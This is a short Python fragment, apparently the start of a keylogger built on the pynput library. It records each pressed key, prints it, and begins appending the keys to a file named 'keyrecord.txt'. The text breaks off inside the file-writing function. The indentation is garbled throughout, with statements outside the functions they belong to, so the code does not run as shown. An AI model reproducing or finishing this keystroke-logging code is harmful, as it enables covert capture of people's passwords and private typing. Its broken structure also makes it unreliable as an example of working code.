# Import python library(pynput)
import pynput

# Import listener key from pynput 
from pynput.keyboard import Key,Listener

count = 0
keys = []


def on_press(key):
    global keys, count

keys.append(key)
    count+=1
    print("{0} pressed".format(key))

if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("keyrecord.txt","a") as f:
